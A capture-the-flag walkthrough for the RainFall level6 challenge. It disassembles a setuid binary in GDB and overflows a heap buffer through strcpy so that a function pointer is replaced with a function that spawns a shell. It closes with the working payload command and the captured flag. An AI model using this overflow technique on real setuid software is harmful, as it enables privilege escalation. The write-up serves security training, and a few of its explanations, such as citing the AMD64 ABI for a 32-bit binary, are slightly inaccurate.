## Walkthrough

We list the files in the current home directory.

```bash
level6@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level6 level6   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level6 level6  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level6 level6 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
-rw-r--r--+ 1 level6 level6   65 Sep 23  2015 .pass
-rw-r--r--  1 level6 level6  675 Apr  3  2012 .profile
level6@RainFall:~$ file level6
level6: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xb1a5ce594393de0f273c64753cede6da01744479, not stripped

```

The file is owned by **level7** and has the **setuid** bit.

We list the functions inside the executable and analyze their assembly code with **GDB**.

```nasm
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f4  _init
0x08048340  strcpy
0x08048340  strcpy@plt
0x08048350  malloc
0x08048350  malloc@plt
0x08048360  puts
0x08048360  puts@plt
0x08048370  system
0x08048370  system@plt
0x08048380  __gmon_start__
0x08048380  __gmon_start__@plt
0x08048390  __libc_start_main
0x08048390  __libc_start_main@plt
0x080483a0  _start
0x080483d0  __do_global_dtors_aux
0x08048430  frame_dummy
0x08048454  n
0x08048468  m
0x0804847c  main
0x080484e0  __libc_csu_init
0x08048550  __libc_csu_fini
0x08048552  __i686.get_pc_thunk.bx
0x08048560  __do_global_ctors_aux
0x0804858c  _fini
```

There are 3 interesting functions: `main()`, `m()` and `n()`.

```nasm
gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:	push   ebp
   0x0804847d <+1>:	mov    ebp,esp
   0x0804847f <+3>:	and    esp,0xfffffff0
   0x08048482 <+6>:	sub    esp,0x20
   0x08048485 <+9>:	mov    DWORD PTR [esp],0x40
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax
   0x080484a5 <+41>:	mov    edx,0x8048468
   0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>:	mov    DWORD PTR [eax],edx
   0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>:	add    eax,0x4
   0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>:	mov    edx,eax
   0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:	call   eax
   0x080484d2 <+86>:	leave  
   0x080484d3 <+87>:	ret    
End of assembler dump.
```

This function: 

- **Aligns the stack**: Adjusts the stack pointer to ensure it is aligned to a 16-byte boundary, adhering to the System V AMD64 ABI calling convention.
- Allocate memory : Invokes the `malloc()` function twice:
    - The first call requests 64 bytes (0x40 in hexadecimal), storing the returned pointer in `[esp + 0x1c]`.
    - The second call requests 4 bytes (0x4 in hexadecimal), storing the returned pointer in `[esp + 0x18]`.

```nasm
0x080484a5 <+41>:	mov    edx,0x8048468
0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]
0x080484ae <+50>:	mov    DWORD PTR [eax],edx

0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
0x080484b3 <+55>:	add    eax,0x4
0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
0x080484b8 <+60>:	mov    edx,eax
0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
```

**Sets up function pointers**:

- Moves the address of the `m()` function (located at `0x8048468`) into the `edx` register.
- Sets the first byte of the memory allocated by the second `malloc()` call to point to `m()`.
- Retrieves the first command-line argument (`argv[1]`) and prepares it for use.

```nasm
 0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx
 0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
 0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
```

- Prepares the arguments for the `strcpy()` function.
- Copies the string from `argv[1]` to the memory allocated by the first `malloc()` call.

```nasm
0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
0x080484d0 <+84>:	call   eax
```

- **Calls function `m()`**: Dereferences the function pointer and invokes the function it points to.

The `m()` function:

```nasm
(gdb) disas m
Dump of assembler code for function m:
   0x08048468 <+0>:	push   ebp
   0x08048469 <+1>:	mov    ebp,esp
   0x0804846b <+3>:	sub    esp,0x18
   0x0804846e <+6>:	mov    DWORD PTR [esp],0x80485d1
   0x08048475 <+13>:	call   0x8048360 <puts@plt>
   0x0804847a <+18>:	leave  
   0x0804847b <+19>:	ret    
End of assembler dump.
```

This function: 

- **Prepares to print a string**: Loads the address of the string "Nope" (located at `0x80485d1`) into the stack.
- **Prints the string**: Calls the `puts()` function to output the string "Nope" to standard output.

Although it is not called by the program, there is a `n()` function:

```nasm
Dump of assembler code for function n:
   0x08048454 <+0>:	push   ebp
   0x08048455 <+1>:	mov    ebp,esp
   0x08048457 <+3>:	sub    esp,0x18
   0x0804845a <+6>:	mov    DWORD PTR [esp],0x80485b0
   0x08048461 <+13>:	call   0x8048370 <system@plt>
   0x08048466 <+18>:	leave  
   0x08048467 <+19>:	ret    
End of assembler dump.
```

This function:

- **Prepares to execute a shell command**: Loads the address of the string "/bin/sh" (located at `0x80485b0`) into the stack.
- **Invokes the shell**: Calls the `system()` function to execute the `/bin/sh` shell, providing an interactive command-line interface.

### Heap smashing using strcpy() vulnerability

The `strcpy()` function is vulnerable to buffer overflow because it does not check if the `destination` buffer is large enough to contain the `source` string. Similarly, the program does not perform this check before calling `strcpy()` . 

### Overwriting the address

To achieve our goal, we need to craft a string such that the total number of characters printed is `72` which is number of bytes between the pointer of the 1st and 2nd malloc allocation.  

This gives us : 

```bash
'a' * 72
```

### Converting the address

The `n()` function is located at the address `0x8048454`. To properly inject this address, we need to represent it in **little-endian** format, as this is how memory addresses are stored on the target system. The little-endian format for the address `0x8048454` is:  `\x54\x84\x04\x08` .

**Little-endian** is a way of representing multi-byte data in memory where the **least significant byte** (the "lowest" byte) is stored at the **lowest memory address**, and the **most significant byte** is stored at the highest memory address.

```nasm
'\x54\x84\x04\x08'
```

### Final command
The final command is :
```bash
The final command is :
level6@RainFall:~$ python -c "print('a' * 72 + '\x54\x84\x04\x08')" > /tmp/level6
level6@RainFall:~$ ./level6 `cat /tmp/level6`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
